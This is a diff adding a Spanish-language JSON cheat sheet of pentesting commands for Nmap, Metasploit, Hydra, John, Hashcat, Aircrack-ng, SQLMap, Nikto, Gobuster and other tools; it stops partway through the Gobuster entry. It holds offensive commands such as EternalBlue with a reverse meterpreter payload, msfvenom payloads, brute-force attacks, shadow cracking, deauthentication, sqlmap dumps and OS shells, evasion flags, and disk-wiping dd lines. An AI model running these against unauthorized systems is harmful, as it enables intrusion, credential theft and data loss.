@@ -1,0 +1,1852 @@
+{
+  "tools": [
+    {    "id": "nmap",
+    "name": "Nmap",
+    "category": "network",
+    "description": "Herramienta de escaneo de red",
+    "commands": [
+      {
+        "title": "Escaneo Básico",
+        "command": "nmap -sV -sC [objetivo]",
+        "description": "Escaneo de versiones y scripts por defecto",
+        "tags": ["basic", "version", "scripts"]
+      },
+      {
+        "title": "Escaneo de Rango IP",
+        "command": "nmap 192.168.1.1-10",
+        "description": "Escanea un rango de direcciones IP",
+        "tags": ["network", "range", "basic"]
+      },
+      {
+        "title": "Escaneo UDP",
+        "command": "nmap -sU [objetivo]",
+        "description": "Realiza un escaneo de puertos UDP",
+        "tags": ["udp", "ports"]
+      },
+      {
+        "title": "Escaneo Agresivo",
+        "command": "nmap -A [objetivo]",
+        "description": "Realiza un escaneo agresivo con detección de OS y versiones",
+        "tags": ["aggressive", "os", "version"]
+      },
+      {
+        "title": "Escaneo con Script NSE Específico",
+        "command": "nmap --script=vuln [objetivo]",
+        "description": "Ejecuta scripts de vulnerabilidad",
+        "tags": ["scripts", "vulnerability"]
+      },
+      {
+        "title": "Escaneo de Red Completa",
+        "command": "nmap 192.168.1.0/24",
+        "description": "Escanea toda una subred",
+        "tags": ["network", "subnet"]
+      },
+      {
+        "title": "Escaneo Rápido",
+        "command": "nmap -F [objetivo]",
+        "description": "Realiza un escaneo rápido de los puertos más comunes",
+        "tags": ["fast", "basic"]
+      },
+      {
+        "title": "Escaneo con Tiempo Específico",
+        "command": "nmap -T4 [objetivo]",
+        "description": "Escaneo con plantilla de temporización agresiva",
+        "tags": ["timing", "speed"]
+      },
+      {
+        "title": "Detección de Firewall",
+        "command": "nmap -sA [objetivo]",
+        "description": "Detecta si hay firewall activo",
+        "tags": ["firewall", "detection"]
+      },
+      {
+        "title": "Escaneo de Scripts HTTP",
+        "command": "nmap --script=http-* [objetivo]",
+        "description": "Ejecuta todos los scripts relacionados con HTTP",
+        "tags": ["http", "scripts"]
+      },
+      {
+        "title": "Escaneo de Fragmentación",
+        "command": "nmap -f [objetivo]",
+        "description": "Usa paquetes fragmentados para evadir firewalls",
+        "tags": ["stealth", "firewall"]
+      },
+      {
+        "title": "Escaneo con Señuelo",
+        "command": "nmap -D RND:10 [objetivo]",
+        "description": "Usa 10 IPs aleatorias como señuelo",
+        "tags": ["decoy", "stealth"]
+      },
+      {
+        "title": "Escaneo de Script SQL",
+        "command": "nmap --script=sql-injection [objetivo]",
+        "description": "Busca vulnerabilidades de inyección SQL",
+        "tags": ["sql", "vulnerability"]
+      },
+      {
+        "title": "Escaneo de Servicios SSL",
+        "command": "nmap --script ssl-enum-ciphers -p 443 [objetivo]",
+        "description": "Enumera cifrados SSL soportados",
+        "tags": ["ssl", "security"]
+      },
+      {
+        "title": "Detección de Host Activos",
+        "command": "nmap -sP 192.168.1.0/24",
+        "description": "Descubre hosts activos en la red",
+        "tags": ["discovery", "network"]
+      }
+      ]
+    },
+    {
+      "id": "metasploit",
+      "name": "Metasploit",
+      "category": "exploitation",
+      "description": "Framework de pruebas de penetración",
+      "commands": [
+        {
+          "title": "Iniciar Metasploit",
+          "command": "msfconsole",
+          "description": "Inicia la consola de Metasploit",
+          "tags": ["basic", "start"]
+        },
+        {
+          "title": "Búsqueda de Exploits",
+          "command": "search type:exploit platform:windows",
+          "description": "Busca exploits disponibles para Windows",
+          "tags": ["search", "exploit"]
+        },
+        {
+          "title": "Usar un Exploit",
+          "command": "use exploit/windows/smb/ms17_010_eternalblue",
+          "description": "Selecciona un exploit específico",
+          "tags": ["exploit", "use"]
+        },
+        {
+          "title": "Listar Opciones",
+          "command": "show options",
+          "description": "Muestra las opciones disponibles del módulo actual",
+          "tags": ["config", "basic"]
+        },
+        {
+          "title": "Configurar RHOST",
+          "command": "set RHOST [IP]",
+          "description": "Establece la IP del objetivo",
+          "tags": ["config", "target"]
+        },
+        {
+          "title": "Configurar Payload",
+          "command": "set payload windows/meterpreter/reverse_tcp",
+          "description": "Establece el payload a usar",
+          "tags": ["payload", "config"]
+        },
+        {
+          "title": "Ejecutar Exploit",
+          "command": "exploit",
+          "description": "Ejecuta el exploit configurado",
+          "tags": ["exploit", "execute"]
+        },
+        {
+          "title": "Modo Background",
+          "command": "background",
+          "description": "Envía la sesión actual al background",
+          "tags": ["session", "management"]
+        },
+        {
+          "title": "Listar Sesiones",
+          "command": "sessions -l",
+          "description": "Muestra las sesiones activas",
+          "tags": ["session", "list"]
+        },
+        {
+          "title": "Reconectar Sesión",
+          "command": "sessions -i [ID]",
+          "description": "Se reconecta a una sesión específica",
+          "tags": ["session", "interact"]
+        },
+        {
+          "title": "Búsqueda Avanzada",
+          "command": "search cve:2021 type:exploit",
+          "description": "Busca exploits por CVE específico",
+          "tags": ["search", "cve"]
+        },
+        {
+          "title": "Crear Handler",
+          "command": "use exploit/multi/handler",
+          "description": "Configura un handler para conexiones reversas",
+          "tags": ["handler", "payload"]
+        },
+        {
+          "title": "Escaneo de Auxiliares",
+          "command": "search type:auxiliary",
+          "description": "Busca módulos auxiliares disponibles",
+          "tags": ["auxiliary", "search"]
+        },
+        {
+          "title": "Usar Scanner SMB",
+          "command": "use auxiliary/scanner/smb/smb_version",
+          "description": "Escanea versiones de SMB",
+          "tags": ["scanner", "smb"]
+        },
+        {
+          "title": "Generar Payload",
+          "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > payload.exe",
+          "description": "Genera un payload ejecutable",
+          "tags": ["payload", "generate"]
+        }
+      ]
+    },
+    {
+      
+      "id": "hydra",
+      "name": "Hydra",
+      "category": "password",
+      "description": "Herramienta de fuerza bruta",
+      "commands": [
+        {
+          "title": "Ataque a FTP",
+          "command": "hydra -l usuario -P contraseñas.txt ftp://192.168.1.1",
+          "description": "Realiza un ataque de fuerza bruta a un servidor FTP",
+          "tags": ["ftp", "brute force"]
+        },
+        {
+          "title": "Ataque a SSH",
+          "command": "hydra -l usuario -P contraseñas.txt ssh://192.168.1.1",
+          "description": "Realiza un ataque de fuerza bruta a un servidor SSH",
+          "tags": ["ssh", "brute force"]
+        },
+        {
+          "title": "Ataque HTTP Post",
+          "command": "hydra -l admin -P pass.txt 192.168.1.1 http-post-form '/login.php:username=^USER^&password=^PASS^:Inicio de sesión fallido'",
+          "description": "Ataque de fuerza bruta a formulario HTTP POST",
+          "tags": ["http", "post", "form"]
+        },
+        {
+          "title": "Ataque HTTP Basic Auth",
+          "command": "hydra -L users.txt -P pass.txt 192.168.1.1 http-get /admin",
+          "description": "Ataque a autenticación básica HTTP",
+          "tags": ["http", "basic auth"]
+        },
+        {
+          "title": "Ataque MySQL",
+          "command": "hydra -l root -P passwords.txt mysql://192.168.1.1",
+          "description": "Fuerza bruta a servidor MySQL",
+          "tags": ["mysql", "database"]
+        },
+        {
+          "title": "Ataque RDP",
+          "command": "hydra -L users.txt -P pass.txt rdp://192.168.1.1",
+          "description": "Ataque a Remote Desktop Protocol",
+          "tags": ["rdp", "windows"]
+        },
+        {
+          "title": "Ataque SMB",
+          "command": "hydra -l administrator -P pass.txt smb://192.168.1.1",
+          "description": "Fuerza bruta a servidor SMB",
+          "tags": ["smb", "windows"]
+        },
+        {
+          "title": "Ataque Telnet",
+          "command": "hydra -L users.txt -P pass.txt telnet://192.168.1.1",
+          "description": "Fuerza bruta a servidor Telnet",
+          "tags": ["telnet", "network"]
+        },
+        {
+          "title": "Ataque SMTP",
+          "command": "hydra -L users.txt -P pass.txt smtp://192.168.1.1",
+          "description": "Fuerza bruta a servidor SMTP",
+          "tags": ["smtp", "email"]
+        },
+        {
+          "title": "Ataque POP3",
+          "command": "hydra -l usuario -P pass.txt pop3://192.168.1.1",
+          "description": "Fuerza bruta a servidor POP3",
+          "tags": ["pop3", "email"]
+        },
+        {
+          "title": "Ataque IMAP",
+          "command": "hydra -l usuario -P pass.txt imap://192.168.1.1",
+          "description": "Fuerza bruta a servidor IMAP",
+          "tags": ["imap", "email"]
+        },
+        {
+          "title": "Múltiples Hilos",
+          "command": "hydra -t 4 -l admin -P pass.txt 192.168.1.1 ssh",
+          "description": "Ataque usando 4 hilos paralelos",
+          "tags": ["threads", "performance"]
+        },
+        {
+          "title": "Tiempo de Espera",
+          "command": "hydra -t 1 -W 3 -l admin -P pass.txt 192.168.1.1 ftp",
+          "description": "Ataque con tiempo de espera de 3 segundos",
+          "tags": ["timeout", "control"]
+        },
+        {
+          "title": "Salida Verbose",
+          "command": "hydra -V -l admin -P pass.txt 192.168.1.1 ssh",
+          "description": "Muestra información detallada del proceso",
+          "tags": ["verbose", "debug"]
+        },
+        {
+          "title": "Guardar Resultado",
+          "command": "hydra -o resultado.txt -l admin -P pass.txt 192.168.1.1 ftp",
+          "description": "Guarda el resultado en un archivo",
+          "tags": ["output", "logging"]
+        }
+      ]
+    },
+    {
+      "id": "wireshark",
+      "name": "Wireshark",
+      "category": "network",
+      "description": "Analizador de tráfico de red",
+      "commands": [
+        {
+          "title": "Filtrar por Protocolo",
+          "command": "tcp",
+          "description": "Filtra el tráfico para mostrar solo paquetes TCP",
+          "tags": ["filter", "tcp"]
+        },
+        {
+          "title": "Filtrar por IP",
+          "command": "ip.addr == 192.168.1.1",
+          "description": "Filtra el tráfico para mostrar solo paquetes de una IP específica",
+          "tags": ["filter", "ip"]
+        },
+        {
+          "title": "Filtrar por Puerto",
+          "command": "tcp.port == 80",
+          "description": "Muestra solo tráfico en el puerto 80",
+          "tags": ["filter", "port"]
+        },
+        {
+          "title": "Filtrar HTTP",
+          "command": "http",
+          "description": "Muestra solo tráfico HTTP",
+          "tags": ["filter", "http"]
+        },
+        {
+          "title": "Filtrar DNS",
+          "command": "dns",
+          "description": "Muestra solo consultas y respuestas DNS",
+          "tags": ["filter", "dns"]
+        },
+        {
+          "title": "Excluir Tráfico",
+          "command": "!arp",
+          "description": "Excluye el tráfico ARP",
+          "tags": ["filter", "exclude"]
+        },
+        {
+          "title": "Filtrar por MAC",
+          "command": "eth.addr == 00:11:22:33:44:55",
+          "description": "Muestra tráfico de una MAC específica",
+          "tags": ["filter", "mac"]
+        },
+        {
+          "title": "Filtrar por Longitud",
+          "command": "frame.len > 100",
+          "description": "Muestra paquetes mayores a 100 bytes",
+          "tags": ["filter", "size"]
+        },
+        {
+          "title": "Filtrar HTTPS",
+          "command": "ssl || tls",
+          "description": "Muestra tráfico SSL/TLS",
+          "tags": ["filter", "https"]
+        },
+        {
+          "title": "Filtrar Errores TCP",
+          "command": "tcp.analysis.flags",
+          "description": "Muestra paquetes TCP con problemas",
+          "tags": ["filter", "errors"]
+        },
+        {
+          "title": "Filtrar por Contenido",
+          "command": "frame contains \"password\"",
+          "description": "Busca paquetes que contengan la palabra password",
+          "tags": ["filter", "content"]
+        },
+        {
+          "title": "Filtrar ICMP",
+          "command": "icmp",
+          "description": "Muestra solo tráfico ICMP",
+          "tags": ["filter", "icmp"]
+        },
+        {
+          "title": "Filtrar Conversación",
+          "command": "ip.addr==192.168.1.1 && ip.addr==192.168.1.2",
+          "description": "Muestra conversación entre dos IPs",
+          "tags": ["filter", "conversation"]
+        },
+        {
+          "title": "Filtrar Broadcasts",
+          "command": "eth.addr == ff:ff:ff:ff:ff:ff",
+          "description": "Muestra paquetes broadcast",
+          "tags": ["filter", "broadcast"]
+        },
+        {
+          "title": "Filtrar por VLAN",
+          "command": "vlan.id == 100",
+          "description": "Muestra tráfico de una VLAN específica",
+          "tags": ["filter", "vlan"]
+        }
+      ]
+    },
+    {
+      "id": "dd",
+      "name": "dd",
+      "category": "system",
+      "description": "Herramienta para copiar y convertir archivos",
+      "commands": [
+        {
+          "title": "Crear una imagen de disco",
+          "command": "dd if=/dev/sda of=backup.img",
+          "description": "Crea una imagen de un disco completo",
+          "tags": ["backup", "disk"]
+        },
+        {
+          "title": "Restaurar una imagen de disco",
+          "command": "dd if=backup.img of=/dev/sda",
+          "description": "Restaura una imagen a un disco",
+          "tags": ["restore", "disk"]
+        },
+        {
+          "title": "Copiar un disco a otro",
+          "command": "dd if=/dev/sda of=/dev/sdb",
+          "description": "Copia el contenido de un disco a otro",
+          "tags": ["copy", "disk"]
+        },
+        {
+          "title": "Crear una imagen comprimida",
+          "command": "dd if=/dev/sda | gzip > backup.img.gz",
+          "description": "Crea una imagen comprimida de un disco",
+          "tags": ["backup", "disk", "compression"]
+        },
+        {
+          "title": "Restaurar una imagen comprimida",
+          "command": "gzip -dc backup.img.gz | dd of=/dev/sda",
+          "description": "Restaura una imagen comprimida a un disco",
+          "tags": ["restore", "disk", "compression"]
+        },
+        {
+          "title": "Borrar un disco de forma segura",
+          "command": "dd if=/dev/urandom of=/dev/sda",
+          "description": "Sobrescribe un disco con datos aleatorios para borrarlo de forma segura",
+          "tags": ["wipe", "security"]
+        },
+        {
+          "title": "Crear una imagen de memoria RAM",
+          "command": "dd if=/dev/mem of=ram.img",
+          "description": "Crea una imagen de la memoria RAM",
+          "tags": ["memory", "forensics"]
+        },
+        {
+          "title": "Crear una imagen de un dispositivo USB",
+          "command": "dd if=/dev/sdb of=usb_backup.img",
+          "description": "Crea una imagen de un dispositivo USB",
+          "tags": ["backup", "usb"]
+        }
+      ]
+    },
+    {
+      "id": "linux-basics",
+      "name": "Comandos Básicos de Linux",
+      "category": "system",
+      "description": "Comandos esenciales para administración de sistemas",
+      "commands": [
+        {
+          "title": "Listar archivos detallado",
+          "command": "ls -la",
+          "description": "Lista archivos incluyendo ocultos con detalles",
+          "tags": ["files", "list"]
+        },
+        {
+          "title": "Buscar archivos",
+          "command": "find / -name archivo.txt",
+          "description": "Busca un archivo en todo el sistema",
+          "tags": ["files", "search"]
+        },
+        {
+          "title": "Ver procesos",
+          "command": "ps aux",
+          "description": "Muestra todos los procesos en ejecución",
+          "tags": ["process", "monitor"]
+        },
+        {
+          "title": "Monitoreo en tiempo real",
+          "command": "top",
+          "description": "Muestra procesos en tiempo real",
+          "tags": ["process", "monitor"]
+        },
+        {
+          "title": "Verificar espacio",
+          "command": "df -h",
+          "description": "Muestra espacio en disco disponible",
+          "tags": ["disk", "storage"]
+        },
+        {
+          "title": "Copiar archivos",
+          "command": "cp origen destino",
+          "description": "Copia archivos o directorios",
+          "tags": ["files", "copy"]
+        },
+        {
+          "title": "Mover archivos",
+          "command": "mv origen destino",
+          "description": "Mueve o renombra archivos",
+          "tags": ["files", "move"]
+        },
+        {
+          "title": "Crear directorio",
+          "command": "mkdir directorio",
+          "description": "Crea un nuevo directorio",
+          "tags": ["directory", "create"]
+        },
+        {
+          "title": "Eliminar archivo",
+          "command": "rm archivo",
+          "description": "Elimina un archivo",
+          "tags": ["files", "delete"]
+        },
+        {
+          "title": "Cambiar permisos",
+          "command": "chmod 755 archivo",
+          "description": "Modifica permisos de archivo",
+          "tags": ["permissions", "security"]
+        },
+        {
+          "title": "Ver contenido",
+          "command": "cat archivo",
+          "description": "Muestra contenido de un archivo",
+          "tags": ["files", "view"]
+        },
+        {
+          "title": "Editar archivo",
+          "command": "nano archivo",
+          "description": "Edita un archivo con nano",
+          "tags": ["files", "edit"]
+        },
+        {
+          "title": "Buscar en archivo",
+          "command": "grep 'texto' archivo",
+          "description": "Busca texto en archivos",
+          "tags": ["files", "search"]
+        },
+        {
+          "title": "Ver uso de memoria",
+          "command": "free -h",
+          "description": "Muestra uso de memoria RAM",
+          "tags": ["memory", "monitor"]
+        },
+        {
+          "title": "Crear enlace simbólico",
+          "command": "ln -s origen enlace",
+          "description": "Crea un enlace simbólico",
+          "tags": ["files", "link"]
+        }
+      ]
+    },
+    {
+      "id": "metadata",
+      "name": "Lectura de Metadatos",
+      "category": "forensics",
+      "description": "Herramientas para leer y analizar metadatos en Kali Linux",
+      "commands": [
+        {
+          "title": "Leer metadatos de imágenes",
+          "command": "exiftool imagen.jpg",
+          "description": "Muestra metadatos de archivos de imagen",
+          "tags": ["metadata", "images"]
+        },
+        {
+          "title": "Leer metadatos de PDF",
+          "command": "pdfinfo documento.pdf",
+          "description": "Muestra metadatos de archivos PDF",
+          "tags": ["metadata", "pdf"]
+        },
+        {
+          "title": "Leer metadatos de documentos",
+          "command": "catdoc -m archivo.doc",
+          "description": "Muestra metadatos de archivos DOC",
+          "tags": ["metadata", "documents"]
+        },
+        {
+          "title": "Leer metadatos de archivos de audio",
+          "command": "exiftool audio.mp3",
+          "description": "Muestra metadatos de archivos de audio",
+          "tags": ["metadata", "audio"]
+        },
+        {
+          "title": "Leer metadatos de archivos de video",
+          "command": "exiftool video.mp4",
+          "description": "Muestra metadatos de archivos de video",
+          "tags": ["metadata", "video"]
+        },
+        {
+          "title": "Leer metadatos de archivos en general",
+          "command": "file archivo",
+          "description": "Muestra información básica sobre el tipo de archivo",
+          "tags": ["metadata", "files"]
+        }
+      ]
+    }
+,    
+    {
+      "id": "john",
+      "name": "John the Ripper",
+      "category": "password",
+      "description": "Herramienta de crackeo de contraseñas",
+      "commands": [
+        {
+          "title": "Crackear archivo shadow",
+          "command": "john /etc/shadow",
+          "description": "Intenta crackear contraseñas del sistema",
+          "tags": ["crack", "shadow"]
+        },
+        {
+          "title": "Usar wordlist",
+          "command": "john --wordlist=diccionario.txt hash.txt",
+          "description": "Usa un diccionario específico",
+          "tags": ["crack", "wordlist"]
+        },
+        {
+          "title": "Mostrar contraseñas crackeadas",
+          "command": "john --show hash.txt",
+          "description": "Muestra las contraseñas ya encontradas",
+          "tags": ["show", "results"]
+        },
+        {
+          "title": "Modo incremental",
+          "command": "john --incremental hash.txt",
+          "description": "Usa modo de fuerza bruta puro",
+          "tags": ["crack", "bruteforce"]
+        },
+        {
+          "title": "Reglas personalizadas",
+          "command": "john --rules --wordlist=dict.txt hash.txt",
+          "description": "Aplica reglas de mutación",
+          "tags": ["rules", "wordlist"]
+        },
+        {
+          "title": "Formato específico",
+          "command": "john --format=md5crypt hash.txt",
+          "description": "Especifica formato de hash",
+          "tags": ["format", "hash"]
+        },
+        {
+          "title": "Sesión guardada",
+          "command": "john --restore",
+          "description": "Restaura sesión anterior",
+          "tags": ["session", "restore"]
+        },
+        {
+          "title": "Límite de tiempo",
+          "command": "john --max-run-time=3600 hash.txt",
+          "description": "Ejecuta por una hora",
+          "tags": ["time", "limit"]
+        },
+        {
+          "title": "Usuarios específicos",
+          "command": "john --users=admin hash.txt",
+          "description": "Crackea solo usuario específico",
+          "tags": ["users", "specific"]
+        },
+        {
+          "title": "Benchmark",
+          "command": "john --test",
+          "description": "Prueba rendimiento del sistema",
+          "tags": ["benchmark", "test"]
+        }
+      ]
+    },
+    {
+      "id": "aircrack",
+      "name": "Aircrack-ng",
+      "category": "wireless",
+      "description": "Suite de herramientas para auditoría WiFi",
+      "commands": [
+        {
+          "title": "Modo monitor",
+          "command": "airmon-ng start wlan0",
+          "description": "Activa modo monitor en interfaz",
+          "tags": ["monitor", "start"]
+        },
+        {
+          "title": "Escanear redes",
+          "command": "airodump-ng wlan0mon",
+          "description": "Muestra redes WiFi cercanas",
+          "tags": ["scan", "networks"]
+        },
+        {
+          "title": "Capturar handshake",
+          "command": "airodump-ng -c 1 --bssid [MAC] -w output wlan0mon",
+          "description": "Captura handshake de red específica",
+          "tags": ["capture", "handshake"]
+        },
+        {
+          "title": "Crackear WPA",
+          "command": "aircrack-ng -w wordlist.txt output*.cap",
+          "description": "Intenta crackear captura WPA",
+          "tags": ["crack", "wpa"]
+        },
+        {
+          "title": "Deautenticación",
+          "command": "aireplay-ng -0 1 -a [BSSID] -c [CLIENT] wlan0mon",
+          "description": "Envía paquete de deautenticación",
+          "tags": ["deauth", "attack"]
+        },
+        {
+          "title": "Crear punto falso",
+          "command": "airbase-ng -e 'FakeAP' -c 6 wlan0mon",
+          "description": "Crea punto de acceso falso",
+          "tags": ["fake", "ap"]
+        },
+        {
+          "title": "Verificar inyección",
+          "command": "aireplay-ng -9 wlan0mon",
+          "description": "Prueba capacidad de inyección",
+          "tags": ["test", "injection"]
+        },
+        {
+          "title": "Filtrar por canal",
+          "command": "airodump-ng -c 6 wlan0mon",
+          "description": "Monitorea solo canal específico",
+          "tags": ["channel", "monitor"]
+        },
+        {
+          "title": "Guardar GPS",
+          "command": "airodump-ng --gpsd wlan0mon",
+          "description": "Guarda datos con coordenadas GPS",
+          "tags": ["gps", "location"]
+        },
+        {
+          "title": "Crackear WEP",
+          "command": "aircrack-ng -b [BSSID] output*.cap",
+          "description": "Intenta crackear red WEP",
+          "tags": ["crack", "wep"]
+        }
+      ]
+    },    {
+      "id": "sqlmap",
+      "name": "SQLMap",
+      "category": "web",
+      "description": "Herramienta automática de detección y explotación SQL injection",
+      "commands": [
+        {
+          "title": "Escaneo Básico",
+          "command": "sqlmap -u \"http://sitio.com/page.php?id=1\"",
+          "description": "Escaneo básico de vulnerabilidades SQL",
+          "tags": ["basic", "scan"]
+        },
+        {
+          "title": "Enumerar Bases de Datos",
+          "command": "sqlmap -u \"URL\" --dbs",
+          "description": "Lista todas las bases de datos disponibles",
+          "tags": ["enumeration", "databases"]
+        },
+        {
+          "title": "Enumerar Tablas",
+          "command": "sqlmap -u \"URL\" -D nombredb --tables",
+          "description": "Lista todas las tablas de una base de datos",
+          "tags": ["enumeration", "tables"]
+        },
+        {
+          "title": "Dumping de Datos",
+          "command": "sqlmap -u \"URL\" -D nombredb -T tabla --dump",
+          "description": "Extrae todos los datos de una tabla",
+          "tags": ["dump", "data"]
+        },
+        {
+          "title": "Usar POST",
+          "command": "sqlmap -u \"URL\" --data=\"user=admin&password=test\"",
+          "description": "Prueba parámetros POST",
+          "tags": ["post", "parameters"]
+        },
+        {
+          "title": "Cookie Authentication",
+          "command": "sqlmap -u \"URL\" --cookie=\"PHPSESSID=abc123\"",
+          "description": "Usa cookie para autenticación",
+          "tags": ["cookie", "auth"]
+        },
+        {
+          "title": "Shell OS",
+          "command": "sqlmap -u \"URL\" --os-shell",
+          "description": "Intenta obtener shell del sistema operativo",
+          "tags": ["shell", "os"]
+        },
+        {
+          "title": "Evasión WAF",
+          "command": "sqlmap -u \"URL\" --tamper=space2comment",
+          "description": "Usa técnicas de evasión de WAF",
+          "tags": ["waf", "evasion"]
+        },
+        {
+          "title": "Escaneo Rápido",
+          "command": "sqlmap -u \"URL\" --batch --random-agent",
+          "description": "Ejecuta escaneo rápido con user-agent aleatorio",
+          "tags": ["quick", "scan"]
+        },
+        {
+          "title": "Técnica Específica",
+          "command": "sqlmap -u \"URL\" --technique=B",
+          "description": "Usa técnica Boolean-based blind",
+          "tags": ["technique", "specific"]
+        }
+      ]
+    },
+    {
+      "id": "burpsuite",
+      "name": "Burp Suite",
+      "category": "web",
+      "description": "Suite de herramientas para pruebas de seguridad web",
+      "commands": [
+        {
+          "title": "Scope Setting",
+          "command": "Target > Scope > Add > ^http://ejemplo\\.com",
+          "description": "Configura el alcance del proyecto",
+          "tags": ["scope", "config"]
+        },
+        {
+          "title": "Spider",
+          "command": "Spider > Options > Add target",
+          "description": "Configura el rastreo del sitio",
+          "tags": ["spider", "crawl"]
+        },
+        {
+          "title": "Intruder Attack",
+          "command": "Intruder > Positions > Add § > Start attack",
+          "description": "Configura un ataque de fuerza bruta",
+          "tags": ["intruder", "attack"]
+        },
+        {
+          "title": "Repeater Test",
+          "command": "Ctrl+R or Send to Repeater",
+          "description": "Envía solicitud al repeater",
+          "tags": ["repeater", "test"]
+        },
+        {
+          "title": "Scanner Active",
+          "command": "Scanner > Active Scanning > New Scan",
+          "description": "Inicia escaneo activo",
+          "tags": ["scanner", "active"]
+        },
+        {
+          "title": "Proxy History",
+          "command": "Proxy > HTTP history > Filter",
+          "description": "Filtra historial del proxy",
+          "tags": ["proxy", "history"]
+        },
+        {
+          "title": "Decoder Base64",
+          "command": "Decoder > Base64 > Decode",
+          "description": "Decodifica texto en Base64",
+          "tags": ["decoder", "base64"]
+        },
+        {
+          "title": "Comparer Analysis",
+          "command": "Comparer > Add > Words",
+          "description": "Compara respuestas por palabras",
+          "tags": ["comparer", "analysis"]
+        },
+        {
+          "title": "Sequencer Analysis",
+          "command": "Sequencer > Start live capture",
+          "description": "Analiza aleatoriedad de tokens",
+          "tags": ["sequencer", "tokens"]
+        },
+        {
+          "title": "Extensions Load",
+          "command": "Extender > BApp Store",
+          "description": "Carga extensiones adicionales",
+          "tags": ["extensions", "load"]
+        }
+      ]
+    },
+    {
+      "id": "hashcat",
+      "name": "Hashcat",
+      "category": "password",
+      "description": "Herramienta avanzada de recuperación de contraseñas",
+      "commands": [
+        {
+          "title": "Ataque por Diccionario",
+          "command": "hashcat -m 0 hashes.txt wordlist.txt",
+          "description": "Ataque usando wordlist",
+          "tags": ["dictionary", "attack"]
+        },
+        {
+          "title": "Ataque por Reglas",
+          "command": "hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule",
+          "description": "Ataque con reglas de mutación",
+          "tags": ["rules", "attack"]
+        },
+        {
+          "title": "Ataque de Fuerza Bruta",
+          "command": "hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a",
+          "description": "Fuerza bruta con caracteres ASCII",
+          "tags": ["bruteforce", "ascii"]
+        },
+        {
+          "title": "Ataque Combinado",
+          "command": "hashcat -m 0 hashes.txt -a 1 wordlist1.txt wordlist2.txt",
+          "description": "Combina dos wordlists",
+          "tags": ["combination", "wordlists"]
+        },
+        {
+          "title": "Mostrar Resultado",
+          "command": "hashcat -m 0 hashes.txt --show",
+          "description": "Muestra hashes crackeados",
+          "tags": ["show", "results"]
+        },
+        {
+          "title": "Benchmark GPU",
+          "command": "hashcat -b",
+          "description": "Prueba rendimiento del hardware",
+          "tags": ["benchmark", "performance"]
+        },
+        {
+          "title": "Ataque con Máscara",
+          "command": "hashcat -m 0 hashes.txt -a 3 ?d?d?d?d?d?d?d?d",
+          "description": "Ataque usando máscara numérica",
+          "tags": ["mask", "numbers"]
+        },
+        {
+          "title": "Modo Híbrido",
+          "command": "hashcat -m 0 hashes.txt -a 6 wordlist.txt ?d?d?d",
+          "description": "Combina wordlist con máscara",
+          "tags": ["hybrid", "wordlist"]
+        },
+        {
+          "title": "Optimización",
+          "command": "hashcat -m 0 hashes.txt wordlist.txt -O",
+          "description": "Usa optimizaciones específicas",
+          "tags": ["optimize", "performance"]
+        },
+        {
+          "title": "Restaurar Sesión",
+          "command": "hashcat -m 0 hashes.txt --restore",
+          "description": "Continúa sesión anterior",
+          "tags": ["restore", "session"]
+        }
+      ]
+    },
+    {
+      "id": "nikto",
+      "name": "Nikto",
+      "category": "web",
+      "description": "Escáner de vulnerabilidades web",
+      "commands": [
+        {
+          "title": "Escaneo Básico",
+          "command": "nikto -h http://objetivo.com",
+          "description": "Realiza un escaneo básico del objetivo",
+          "tags": ["basic", "scan"]
+        },
+        {
+          "title": "Escaneo con SSL",
+          "command": "nikto -h https://objetivo.com -ssl",
+          "description": "Escaneo de sitio con SSL/TLS",
+          "tags": ["ssl", "secure"]
+        },
+        {
+          "title": "Escaneo Detallado",
+          "command": "nikto -h objetivo.com -Display V",
+          "description": "Muestra información detallada del escaneo",
+          "tags": ["verbose", "detailed"]
+        },
+        {
+          "title": "Guardar Reporte",
+          "command": "nikto -h objetivo.com -o reporte.html -Format htm",
+          "description": "Guarda resultados en formato HTML",
+          "tags": ["report", "output"]
+        },
+        {
+          "title": "Puerto Específico",
+          "command": "nikto -h objetivo.com -p 8080",
+          "description": "Escanea un puerto específico",
+          "tags": ["port", "specific"]
+        },
+        {
+          "title": "Múltiples Puertos",
+          "command": "nikto -h objetivo.com -p 80,443,8080",
+          "description": "Escanea varios puertos",
+          "tags": ["ports", "multiple"]
+        },
+        {
+          "title": "Actualizar Base de Datos",
+          "command": "nikto -update",
+          "description": "Actualiza la base de datos de plugins",
+          "tags": ["update", "database"]
+        },
+        {
+          "title": "Plugins Específicos",
+          "command": "nikto -h objetivo.com -Plugins \"robots;headers\"",
+          "description": "Ejecuta plugins específicos",
+          "tags": ["plugins", "specific"]
+        },
+        {
+          "title": "Autenticación",
+          "command": "nikto -h objetivo.com -id admin:password",
+          "description": "Escaneo con credenciales básicas",
+          "tags": ["auth", "credentials"]
+        },
+        {
+          "title": "Evasión IDS",
+          "command": "nikto -h objetivo.com -evasion 1",
+          "description": "Usa técnicas de evasión",
+          "tags": ["evasion", "ids"]
+        }
+      ]
+    },
+    {
+      "id": "gobuster",
+      "name": "Gobuster",
+      "category": "web",
+      "description": "Herramienta de enumeración de directorios y DNS",
+      "commands": [
+        {
+          "title": "Enumeración de Directorios",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt",
+          "description": "Busca directorios usando wordlist",
+          "tags": ["directory", "enum"]
+        },
+        {
+          "title": "Enumeración DNS",
+          "command": "gobuster dns -d objetivo.com -w subdominios.txt",
+          "description": "Busca subdominios",
+          "tags": ["dns", "subdomains"]
+        },
+        {
+          "title": "Búsqueda de Archivos",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt -x php,txt,html",
+          "description": "Busca archivos con extensiones específicas",
+          "tags": ["files", "extensions"]
+        },
+        {
+          "title": "Modo Silencioso",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt -q",
+          "description": "Ejecuta en modo silencioso",
+          "tags": ["quiet", "mode"]
+        },
+        {
+          "title": "Excluir Códigos",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt -b 403,404",
+          "description": "Excluye códigos de respuesta específicos",
+          "tags": ["status", "exclude"]
+        },
+        {
+          "title": "Incluir Longitud",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt -l",
+          "description": "Muestra longitud de respuestas",
+          "tags": ["length", "response"]
+        },
+        {
+          "title": "Usuario Agente",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt -a \"Mozilla/5.0\"",
+          "description": "Especifica User-Agent",
